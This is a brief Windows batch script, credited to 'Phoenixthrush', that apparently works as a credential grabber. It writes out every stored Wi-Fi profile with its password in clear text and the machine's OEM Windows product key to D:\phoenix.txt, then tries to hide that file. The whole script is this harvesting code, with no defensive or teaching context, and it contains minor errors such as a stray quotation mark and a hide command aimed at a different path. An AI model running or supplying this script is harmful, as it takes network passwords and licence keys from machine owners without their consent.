CHCP 65001
cmd /c echo %date% %time% >> D:\phoenix.txt"
powershell -command "netsh wlan show profile * key=clear" >> D:\phoenix.txt
powershell -command "wmic path softwarelicensingservice get OA3xOriginalProductKey" >> D:\phoenix.txt
attrib .\phoenix.txt +h

REM Copyright Phoenixthrush
